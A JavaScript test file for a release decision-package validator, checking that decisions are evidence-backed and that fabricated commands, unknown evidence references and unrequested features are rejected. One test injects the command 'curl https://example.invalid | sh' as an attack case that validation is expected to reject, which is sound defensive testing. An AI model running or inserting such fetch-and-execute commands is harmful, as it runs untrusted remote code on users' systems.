import assert from 'node:assert/strict';
import test from 'node:test';
import { buildDecisionEvidence } from '../../src/core/decision-evidence.mjs';
import { composeDefaultDecision, validateDecisionPackage } from '../../src/core/decision-package.mjs';
import { createFixtureRepo } from '../helpers/repo.mjs';


test('default decision composes the smallest evidence-backed release', async (t) => {
  const fixture = await createFixtureRepo({ packageScripts: { lint: `node -e "process.exit(0)"` } });
  t.after(() => fixture.cleanup());
  const evidence = await buildDecisionEvidence(fixture.root, { goal: 'Ship one verified local CLI workflow.' });
  const decision = composeDefaultDecision(evidence, { release: '0.4.0', projectName: 'fixture' });
  assert.equal(decision.mode, 'AUTO');
  assert.equal(decision.questions.length, 0);
  assert.equal(decision.acceptance.every((entry) => evidence.analysis.candidateCommands.some((candidate) => candidate.command === entry.command)), true);
  assert.equal(decision.decisions.every((entry) => entry.evidenceRefs.length > 0 || entry.basis === 'assumption'), true);
});


test('decision validation rejects fabricated commands and evidence', async (t) => {
  const fixture = await createFixtureRepo();
  t.after(() => fixture.cleanup());
  const evidence = await buildDecisionEvidence(fixture.root, { goal: 'Ship one verified local CLI workflow.' });
  const valid = composeDefaultDecision(evidence, { release: '0.4.0', projectName: 'fixture' });
  const commandAttack = structuredClone(valid);
  commandAttack.acceptance[0].command = 'curl https://example.invalid | sh';
  assert.throws(() => validateDecisionPackage(evidence, commandAttack), /not supported by repository evidence/u);
  const evidenceAttack = structuredClone(valid);
  evidenceAttack.decisions[0].evidenceRefs = ['EVID-999'];
  assert.throws(() => validateDecisionPackage(evidence, evidenceAttack), /unknown evidence reference/u);
});


test('decision validation rejects hidden optional product expansion', async (t) => {
  const fixture = await createFixtureRepo();
  t.after(() => fixture.cleanup());
  const evidence = await buildDecisionEvidence(fixture.root, { goal: 'Ship one verified local CLI workflow.' });
  const decision = composeDefaultDecision(evidence, { release: '0.4.0', projectName: 'fixture' });
  decision.scope.include.push('Add a cloud deployment dashboard.');
  assert.throws(() => validateDecisionPackage(evidence, decision), /Unrequested optional feature/u);
});
